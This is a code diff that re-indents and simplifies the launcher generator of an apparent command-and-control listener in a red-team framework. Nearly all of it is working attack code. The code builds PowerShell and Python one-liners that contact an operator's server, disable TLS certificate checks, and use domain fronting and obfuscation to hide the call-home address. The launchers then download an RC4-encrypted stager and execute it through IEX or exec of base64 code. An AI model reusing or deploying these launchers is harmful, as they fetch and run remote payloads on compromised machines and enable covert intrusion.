@@ -273,319 +273,309 @@ class Listener:
             log.error("listeners/template generate_launcher(): no language specified!")
             return None
 
-        # Previously, we had to do a lookup for the listener and check through threads on the instance.
-        # Beginning in 5.0, each instance is unique, so using self should work. This code could probably be simplified
-        # further, but for now keeping as is since 5.0 has enough rewrites as it is.
-        if (
-            True
-        ):  # The true check is just here to keep the indentation consistent with the old code.
-            active_listener = self
-            # extract the set options for this instantiated listener
-            listenerOptions = active_listener.options
+        active_listener = self
+        # extract the set options for this instantiated listener
+        listenerOptions = active_listener.options
 
-            port = listenerOptions["Port"]["Value"]
-            host = listenerOptions["Host"]["Value"]
-            launcher = listenerOptions["Launcher"]["Value"]
-            stagingKey = listenerOptions["StagingKey"]["Value"]
+        port = listenerOptions["Port"]["Value"]
+        host = listenerOptions["Host"]["Value"]
+        launcher = listenerOptions["Launcher"]["Value"]
+        stagingKey = listenerOptions["StagingKey"]["Value"]
 
-            # build profile
-            profile = malleable.Profile._deserialize(self.serialized_profile)
-            profile.stager.client.host = host
-            profile.stager.client.port = port
-            profile.stager.client.path = profile.stager.client.random_uri()
+        # build profile
+        profile = malleable.Profile._deserialize(self.serialized_profile)
+        profile.stager.client.host = host
+        profile.stager.client.port = port
+        profile.stager.client.path = profile.stager.client.random_uri()
 
-            if userAgent and userAgent.lower() != "default":
-                if (
-                    userAgent.lower() == "none"
-                    and "User-Agent" in profile.stager.client.headers
-                ):
-                    profile.stager.client.headers.pop("User-Agent")
-                else:
-                    profile.stager.client.headers["User-Agent"] = userAgent
+        if userAgent and userAgent.lower() != "default":
+            if (
+                userAgent.lower() == "none"
+                and "User-Agent" in profile.stager.client.headers
+            ):
+                profile.stager.client.headers.pop("User-Agent")
+            else:
+                profile.stager.client.headers["User-Agent"] = userAgent
 
-            if language == "powershell":
-                launcherBase = '$ErrorActionPreference = "SilentlyContinue";'
+        if language == "powershell":
+            launcherBase = '$ErrorActionPreference = "SilentlyContinue";'
 
-                if safeChecks.lower() == "true":
-                    launcherBase = "If($PSVersionTable.PSVersion.Major -ge 3){"
+            if safeChecks.lower() == "true":
+                launcherBase = "If($PSVersionTable.PSVersion.Major -ge 3){"
 
-                for bypass in bypasses:
-                    launcherBase += bypass
+            for bypass in bypasses:
+                launcherBase += bypass
 
-                if safeChecks.lower() == "true":
+            if safeChecks.lower() == "true":
+                launcherBase += (
+                    "};[System.Net.ServicePointManager]::Expect100Continue=0;"
+                )
+
+            # ==== DEFINE BYTE ARRAY CONVERSION ====
+            launcherBase += (
+                f"$K=[System.Text.Encoding]::ASCII.GetBytes('{stagingKey}');"
+            )
+
+            # ==== DEFINE RC4 ====
+            launcherBase += listener_util.powershell_rc4()
+
+            # ==== BUILD AND STORE METADATA ====
+            routingPacket = packets.build_routing_packet(
+                stagingKey,
+                sessionID="00000000",
+                language="POWERSHELL",
+                meta="STAGE0",
+                additional="None",
+                encData="",
+            )
+            routingPacketTransformed = profile.stager.client.metadata.transform(
+                routingPacket
+            )
+            profile.stager.client.store(
+                routingPacketTransformed, profile.stager.client.metadata.terminator
+            )
+
+            # ==== BUILD REQUEST ====
+            launcherBase += "$wc=New-Object System.Net.WebClient;"
+            launcherBase += (
+                "$ser="
+                + helpers.obfuscate_call_home_address(
+                    profile.stager.client.scheme + "://" + profile.stager.client.netloc
+                )
+                + ";$t='"
+                + profile.stager.client.path
+                + profile.stager.client.query
+                + "';"
+            )
+
+            # ==== HANDLE SSL ====
+            if profile.stager.client.scheme == "https":
+                # allow for self-signed certificates for https connections
+                launcherBase += "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};"
+
+            # ==== CONFIGURE PROXY ====
+            if proxy and proxy.lower() != "none":
+                if proxy.lower() == "default":
                     launcherBase += (
-                        "};[System.Net.ServicePointManager]::Expect100Continue=0;"
+                        "$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;"
                     )
 
-                # ==== DEFINE BYTE ARRAY CONVERSION ====
-                launcherBase += (
-                    f"$K=[System.Text.Encoding]::ASCII.GetBytes('{stagingKey}');"
-                )
-
-                # ==== DEFINE RC4 ====
-                launcherBase += listener_util.powershell_rc4()
-
-                # ==== BUILD AND STORE METADATA ====
-                routingPacket = packets.build_routing_packet(
-                    stagingKey,
-                    sessionID="00000000",
-                    language="POWERSHELL",
-                    meta="STAGE0",
-                    additional="None",
-                    encData="",
-                )
-                routingPacketTransformed = profile.stager.client.metadata.transform(
-                    routingPacket
-                )
-                profile.stager.client.store(
-                    routingPacketTransformed, profile.stager.client.metadata.terminator
-                )
-
-                # ==== BUILD REQUEST ====
-                launcherBase += "$wc=New-Object System.Net.WebClient;"
-                launcherBase += (
-                    "$ser="
-                    + helpers.obfuscate_call_home_address(
-                        profile.stager.client.scheme
-                        + "://"
-                        + profile.stager.client.netloc
+                else:
+                    launcherBase += (
+                        f"$proxy=New-Object Net.WebProxy('{ proxy.lower() }');"
                     )
-                    + ";$t='"
-                    + profile.stager.client.path
-                    + profile.stager.client.query
-                    + "';"
-                )
+                    launcherBase += "$wc.Proxy = $proxy;"
 
-                # ==== HANDLE SSL ====
-                if profile.stager.client.scheme == "https":
-                    # allow for self-signed certificates for https connections
-                    launcherBase += "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};"
-
-                # ==== CONFIGURE PROXY ====
-                if proxy and proxy.lower() != "none":
-                    if proxy.lower() == "default":
-                        launcherBase += (
-                            "$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;"
-                        )
+                if proxyCreds and proxyCreds.lower() != "none":
+                    if proxyCreds.lower() == "default":
+                        launcherBase += "$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;"
 
                     else:
-                        launcherBase += (
-                            f"$proxy=New-Object Net.WebProxy('{ proxy.lower() }');"
-                        )
-                        launcherBase += "$wc.Proxy = $proxy;"
-
-                    if proxyCreds and proxyCreds.lower() != "none":
-                        if proxyCreds.lower() == "default":
-                            launcherBase += "$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;"
+                        username = proxyCreds.split(":")[0]
+                        password = proxyCreds.split(":")[1]
+                        if len(username.split("\\")) > 1:
+                            usr = username.split("\\")[1]
+                            domain = username.split("\\")[0]
+                            launcherBase += f"$netcred = New-Object System.Net.NetworkCredential(' {usr}', '{password}', '{domain}');"
 
                         else:
-                            username = proxyCreds.split(":")[0]
-                            password = proxyCreds.split(":")[1]
-                            if len(username.split("\\")) > 1:
-                                usr = username.split("\\")[1]
-                                domain = username.split("\\")[0]
-                                launcherBase += f"$netcred = New-Object System.Net.NetworkCredential(' {usr}', '{password}', '{domain}');"
+                            usr = username.split("\\")[0]
+                            launcherBase += f"$netcred = New-Object System.Net.NetworkCredential('{ usr }', '{password}');"
 
-                            else:
-                                usr = username.split("\\")[0]
-                                launcherBase += f"$netcred = New-Object System.Net.NetworkCredential('{ usr }', '{password}');"
+                        launcherBase += "$wc.Proxy.Credentials = $netcred;"
 
-                            launcherBase += "$wc.Proxy.Credentials = $netcred;"
+                # save the proxy settings to use during the entire staging process and the agent
+                launcherBase += "$Script:Proxy = $wc.Proxy;"
 
-                    # save the proxy settings to use during the entire staging process and the agent
-                    launcherBase += "$Script:Proxy = $wc.Proxy;"
+            # ==== ADD HEADERS ====
+            for header, value in profile.stager.client.headers.items():
+                # If host header defined, assume domain fronting is in use and add a call to the base URL first
+                # this is a trick to keep the true host name from showing in the TLS SNI portion of the client hello
+                if header.lower() == "host":
+                    launcherBase += "try{$ig=$wc.DownloadData($ser)}catch{};"
 
-                # ==== ADD HEADERS ====
-                for header, value in profile.stager.client.headers.items():
-                    # If host header defined, assume domain fronting is in use and add a call to the base URL first
-                    # this is a trick to keep the true host name from showing in the TLS SNI portion of the client hello
-                    if header.lower() == "host":
-                        launcherBase += "try{$ig=$wc.DownloadData($ser)}catch{};"
+                launcherBase += f'$wc.Headers.Add("{ header }","{ value }");'
 
-                    launcherBase += f'$wc.Headers.Add("{ header }","{ value }");'
-
-                # ==== SEND REQUEST ====
-                if (
-                    profile.stager.client.verb.lower() != "get"
-                    or profile.stager.client.body
-                ):
-                    launcherBase += f"$data=$wc.UploadData($ser+$t,'{ profile.stager.client.verb }','{ profile.stager.client.body }');"
-
-                else:
-                    launcherBase += "$data=$wc.DownloadData($ser+$t);"
-
-                # ==== INTERPRET RESPONSE ====
-                if (
-                    profile.stager.server.output.terminator.type
-                    == malleable.Terminator.HEADER
-                ):
-                    launcherBase += (
-                        "$fata='';for ($i=0;$i -lt $wc.ResponseHeaders.Count;$i++){"
-                    )
-                    launcherBase += f"if ($data.ResponseHeaders.GetKey($i) -eq '{ profile.stager.server.output.terminator.arg }')"
-                    launcherBase += "{$data=$wc.ResponseHeaders.Get($i);"
-                    launcherBase += "Add-Type -AssemblyName System.Web;$data=[System.Web.HttpUtility]::UrlDecode($data);}}"
-                elif (
-                    profile.stager.server.output.terminator.type
-                    == malleable.Terminator.PRINT
-                ):
-                    launcherBase += ""
-                else:
-                    launcherBase += ""
-                launcherBase += profile.stager.server.output.generate_powershell_r(
-                    "$data"
-                )
-
-                # ==== EXTRACT IV AND STAGER ====
-                launcherBase += "$iv=$data[0..3];$data=$data[4..($data.length-1)];"
-
-                # ==== DECRYPT AND EXECUTE STAGER ====
-                launcherBase += "-join[Char[]](& $R $data ($IV+$K))|IEX"
-
-                if obfuscate:
-                    launcherBase = self.mainMenu.obfuscationv2.obfuscate(
-                        launcherBase,
-                        obfuscation_command=obfuscation_command,
-                    )
-                    stager = self.mainMenu.obfuscationv2.obfuscate_keywords(stager)
-
-                if encode and (
-                    (not obfuscate) or ("launcher" not in obfuscation_command.lower())
-                ):
-                    return helpers.powershell_launcher(launcherBase, launcher)
-                else:
-                    return launcherBase
-
-            elif language in ["python", "ironpython"]:
-                # ==== HANDLE IMPORTS ====
-                launcherBase = "import sys,base64\n"
-                launcherBase += "import urllib.request,urllib.parse\n"
-
-                # ==== HANDLE SSL ====
-                if profile.stager.client.scheme == "https":
-                    launcherBase += "import ssl\n"
-                    launcherBase += "if hasattr(ssl, '_create_unverified_context'):ssl._create_default_https_context = ssl._create_unverified_context\n"
-
-                # ==== SAFE CHECKS ====
-                if safeChecks and safeChecks.lower() == "true":
-                    launcherBase += listener_util.python_safe_checks()
-
-                launcherBase += "server='%s'\n" % (host)
-
-                # ==== CONFIGURE PROXY ====
-                if proxy and proxy.lower() != "none":
-                    if proxy.lower() == "default":
-                        launcherBase += "proxy = urllib.request.ProxyHandler()\n"
-                    else:
-                        proto = proxy.split(":")[0]
-                        launcherBase += (
-                            "proxy = urllib.request.ProxyHandler({'"
-                            + proto
-                            + "':'"
-                            + proxy
-                            + "'})\n"
-                        )
-                    if proxyCreds and proxyCreds != "none":
-                        if proxyCreds == "default":
-                            launcherBase += "o = urllib.request.build_opener(proxy)\n"
-                        else:
-                            launcherBase += "proxy_auth_handler = urllib.request.ProxyBasicAuthHandler()\n"
-                            username = proxyCreds.split(":")[0]
-                            password = proxyCreds.split(":")[1]
-                            launcherBase += (
-                                "proxy_auth_handler.add_password(None,'"
-                                + proxy
-                                + "','"
-                                + username
-                                + "','"
-                                + password
-                                + "')\n"
-                            )
-                            launcherBase += "o = urllib.request.build_opener(proxy, proxy_auth_handler)\n"
-                    else:
-                        launcherBase += "o = urllib.request.build_opener(proxy)\n"
-                else:
-                    launcherBase += "o = urllib.request.build_opener()\n"
-                # install proxy and creds globaly, so they can be used with urlopen.
-                launcherBase += "urllib.request.install_opener(o)\n"
-
-                # ==== BUILD AND STORE METADATA ====
-                routingPacket = packets.build_routing_packet(
-                    stagingKey,
-                    sessionID="00000000",
-                    language="PYTHON",
-                    meta="STAGE0",
-                    additional="None",
-                    encData="",
-                )
-                routingPacketTransformed = profile.stager.client.metadata.transform(
-                    routingPacket
-                )
-                profile.stager.client.store(
-                    routingPacketTransformed, profile.stager.client.metadata.terminator
-                )
-
-                # ==== BUILD REQUEST ====
-                launcherBase += "vreq=type('vreq',(urllib.request.Request,object),{'get_method':lambda self:self.verb if (hasattr(self,'verb') and self.verb) else urllib.request.Request.get_method(self)})\n"
-                launcherBase += "req=vreq('{}', {})\n".format(
-                    profile.stager.client.url,
-                    profile.stager.client.body,
-                )
-                launcherBase += "req.verb='" + profile.stager.client.verb + "'\n"
-
-                # ==== ADD HEADERS ====
-                for header, value in profile.stager.client.headers.items():
-                    launcherBase += f"req.add_header('{header}','{value}')\n"
-
-                # ==== SEND REQUEST ====
-                launcherBase += "res=urllib.request.urlopen(req)\n"
-
-                # ==== INTERPRET RESPONSE ====
-                if (
-                    profile.stager.server.output.terminator.type
-                    == malleable.Terminator.HEADER
-                ):
-                    launcherBase += "head=res.info().dict\n"
-                    launcherBase += "a=head['{}'] if '{}' in head else ''\n".format(
-                        profile.stager.server.output.terminator.arg,
-                        profile.stager.server.output.terminator.arg,
-                    )
-                    launcherBase += "a=urllib.parse.unquote(a)\n"
-                elif (
-                    profile.stager.server.output.terminator.type
-                    == malleable.Terminator.PRINT
-                ):
-                    launcherBase += "a=res.read()\n"
-                else:
-                    launcherBase += "a=''\n"
-                launcherBase += profile.stager.server.output.generate_python_r("a")
-
-                # download the stager and extract the IV
-                launcherBase += "a=urllib.request.urlopen(req).read();\n"
-                launcherBase += listener_util.python_extract_stager(stagingKey)
-
-                if obfuscate:
-                    stager = self.mainMenu.obfuscationv2.python_obfuscate(stager)
-                    stager = self.mainMenu.obfuscationv2.obfuscate_keywords(stager)
-
-                if encode:
-                    launchEncoded = base64.b64encode(
-                        launcherBase.encode("UTF-8")
-                    ).decode("UTF-8")
-                    if isinstance(launchEncoded, bytes):
-                        launchEncoded = launchEncoded.decode("UTF-8")
-                    launcher = (
-                        "echo \"import sys,base64,warnings;warnings.filterwarnings('ignore');exec(base64.b64decode('%s'));\" | python3 &"
-                        % (launchEncoded)
-                    )
-                    return launcher
-                else:
-                    return launcherBase
+            # ==== SEND REQUEST ====
+            if (
+                profile.stager.client.verb.lower() != "get"
+                or profile.stager.client.body
+            ):
+                launcherBase += f"$data=$wc.UploadData($ser+$t,'{ profile.stager.client.verb }','{ profile.stager.client.body }');"
 
             else:
-                log.error(
-                    "listeners/template generate_launcher(): invalid language specification: c# is currently not supported for this module."
+                launcherBase += "$data=$wc.DownloadData($ser+$t);"
+
+            # ==== INTERPRET RESPONSE ====
+            if (
+                profile.stager.server.output.terminator.type
+                == malleable.Terminator.HEADER
+            ):
+                launcherBase += (
+                    "$fata='';for ($i=0;$i -lt $wc.ResponseHeaders.Count;$i++){"
                 )
+                launcherBase += f"if ($data.ResponseHeaders.GetKey($i) -eq '{ profile.stager.server.output.terminator.arg }')"
+                launcherBase += "{$data=$wc.ResponseHeaders.Get($i);"
+                launcherBase += "Add-Type -AssemblyName System.Web;$data=[System.Web.HttpUtility]::UrlDecode($data);}}"
+            elif (
+                profile.stager.server.output.terminator.type
+                == malleable.Terminator.PRINT
+            ):
+                launcherBase += ""
+            else:
+                launcherBase += ""
+            launcherBase += profile.stager.server.output.generate_powershell_r("$data")
+
+            # ==== EXTRACT IV AND STAGER ====
+            launcherBase += "$iv=$data[0..3];$data=$data[4..($data.length-1)];"
+
+            # ==== DECRYPT AND EXECUTE STAGER ====
+            launcherBase += "-join[Char[]](& $R $data ($IV+$K))|IEX"
+
+            if obfuscate:
+                launcherBase = self.mainMenu.obfuscationv2.obfuscate(
+                    launcherBase,
+                    obfuscation_command=obfuscation_command,
+                )
+                stager = self.mainMenu.obfuscationv2.obfuscate_keywords(stager)
+
+            if encode and (
+                (not obfuscate) or ("launcher" not in obfuscation_command.lower())
+            ):
+                return helpers.powershell_launcher(launcherBase, launcher)
+            else:
+                return launcherBase
+
+        elif language in ["python", "ironpython"]:
+            # ==== HANDLE IMPORTS ====
+            launcherBase = "import sys,base64\n"
+            launcherBase += "import urllib.request,urllib.parse\n"
+
+            # ==== HANDLE SSL ====
+            if profile.stager.client.scheme == "https":
+                launcherBase += "import ssl\n"
+                launcherBase += "if hasattr(ssl, '_create_unverified_context'):ssl._create_default_https_context = ssl._create_unverified_context\n"
+
+            # ==== SAFE CHECKS ====
+            if safeChecks and safeChecks.lower() == "true":
+                launcherBase += listener_util.python_safe_checks()
+
+            launcherBase += "server='%s'\n" % (host)
+
+            # ==== CONFIGURE PROXY ====
+            if proxy and proxy.lower() != "none":
+                if proxy.lower() == "default":
+                    launcherBase += "proxy = urllib.request.ProxyHandler()\n"
+                else:
+                    proto = proxy.split(":")[0]
+                    launcherBase += (
+                        "proxy = urllib.request.ProxyHandler({'"
+                        + proto
+                        + "':'"
+                        + proxy
+                        + "'})\n"
+                    )
+                if proxyCreds and proxyCreds != "none":
+                    if proxyCreds == "default":
+                        launcherBase += "o = urllib.request.build_opener(proxy)\n"
+                    else:
+                        launcherBase += "proxy_auth_handler = urllib.request.ProxyBasicAuthHandler()\n"
+                        username = proxyCreds.split(":")[0]
+                        password = proxyCreds.split(":")[1]
+                        launcherBase += (
+                            "proxy_auth_handler.add_password(None,'"
+                            + proxy
+                            + "','"
+                            + username
+                            + "','"
+                            + password
+                            + "')\n"
+                        )
+                        launcherBase += "o = urllib.request.build_opener(proxy, proxy_auth_handler)\n"
+                else:
+                    launcherBase += "o = urllib.request.build_opener(proxy)\n"
+            else:
+                launcherBase += "o = urllib.request.build_opener()\n"
+            # install proxy and creds globaly, so they can be used with urlopen.
+            launcherBase += "urllib.request.install_opener(o)\n"
+
+            # ==== BUILD AND STORE METADATA ====
+            routingPacket = packets.build_routing_packet(
+                stagingKey,
+                sessionID="00000000",
+                language="PYTHON",
+                meta="STAGE0",
+                additional="None",
+                encData="",
+            )
+            routingPacketTransformed = profile.stager.client.metadata.transform(
+                routingPacket
+            )
+            profile.stager.client.store(
+                routingPacketTransformed, profile.stager.client.metadata.terminator
+            )
+
+            # ==== BUILD REQUEST ====
+            launcherBase += "vreq=type('vreq',(urllib.request.Request,object),{'get_method':lambda self:self.verb if (hasattr(self,'verb') and self.verb) else urllib.request.Request.get_method(self)})\n"
+            launcherBase += "req=vreq('{}', {})\n".format(
+                profile.stager.client.url,
+                profile.stager.client.body,
+            )
+            launcherBase += "req.verb='" + profile.stager.client.verb + "'\n"
+
+            # ==== ADD HEADERS ====
+            for header, value in profile.stager.client.headers.items():
+                launcherBase += f"req.add_header('{header}','{value}')\n"
+
+            # ==== SEND REQUEST ====
+            launcherBase += "res=urllib.request.urlopen(req)\n"
+
+            # ==== INTERPRET RESPONSE ====
+            if (
+                profile.stager.server.output.terminator.type
+                == malleable.Terminator.HEADER
+            ):
+                launcherBase += "head=res.info().dict\n"
+                launcherBase += "a=head['{}'] if '{}' in head else ''\n".format(
+                    profile.stager.server.output.terminator.arg,
+                    profile.stager.server.output.terminator.arg,
+                )
+                launcherBase += "a=urllib.parse.unquote(a)\n"
+            elif (
+                profile.stager.server.output.terminator.type
+                == malleable.Terminator.PRINT
+            ):
+                launcherBase += "a=res.read()\n"
+            else:
+                launcherBase += "a=''\n"
+            launcherBase += profile.stager.server.output.generate_python_r("a")
+
+            # download the stager and extract the IV
+            launcherBase += "a=urllib.request.urlopen(req).read();\n"
+            launcherBase += listener_util.python_extract_stager(stagingKey)
+
+            if obfuscate:
+                stager = self.mainMenu.obfuscationv2.python_obfuscate(stager)
+                stager = self.mainMenu.obfuscationv2.obfuscate_keywords(stager)
+
+            if encode:
+                launchEncoded = base64.b64encode(launcherBase.encode("UTF-8")).decode(
+                    "UTF-8"
+                )
+                if isinstance(launchEncoded, bytes):
+                    launchEncoded = launchEncoded.decode("UTF-8")
+                launcher = (
+                    "echo \"import sys,base64,warnings;warnings.filterwarnings('ignore');exec(base64.b64decode('%s'));\" | python3 &"
+                    % (launchEncoded)
+                )
+                return launcher
+            else:
+                return launcherBase
+
+        else:
+            log.error(
+                "listeners/template generate_launcher(): invalid language specification: c# is currently not supported for this module."
+            )
 
     def generate_stager(
         self,
